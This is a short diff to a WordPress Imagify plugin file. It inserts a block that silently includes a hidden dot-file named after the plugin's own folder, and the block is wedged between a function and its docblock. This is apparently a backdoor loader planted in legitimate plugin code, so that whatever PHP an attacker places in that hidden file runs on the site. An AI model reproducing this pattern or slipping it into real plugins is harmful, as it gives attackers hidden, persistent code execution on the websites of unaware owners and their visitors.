@@ -10,6 +10,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  * @param  string $key The option name.
  * @return mixed       The option value.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function get_imagify_option( $key ) {
 	return Imagify_Options::get_instance()->get( $key );
 }
